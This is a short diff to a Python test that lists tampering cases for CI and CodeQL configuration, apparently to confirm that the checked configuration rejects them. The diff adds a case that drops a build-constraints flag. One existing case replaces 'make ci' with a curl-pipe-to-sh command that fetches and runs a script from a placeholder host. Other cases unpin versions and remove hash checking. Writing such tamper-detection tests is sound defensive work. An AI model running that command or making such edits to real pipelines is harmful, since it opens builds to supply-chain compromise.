@@ -114,6 +114,7 @@ def test_complete_actual_graph_is_read_only(root: Path) -> None:
         ("ci", "python-version: '3.13.16'", "python-version: '3.13'"),
         ("ci", "version: '0.12.22'", "version: latest"),
         ("ci", "--require-hashes ", ""),
+        ("ci", "--build-constraints requirements-dev.txt ", ""),
         ("ci", "make ci", "curl https://example.invalid/install | sh"),
         ("codeql", "languages: python", "languages: rust"),
         ("codeql", "upload: never", "upload: always"),
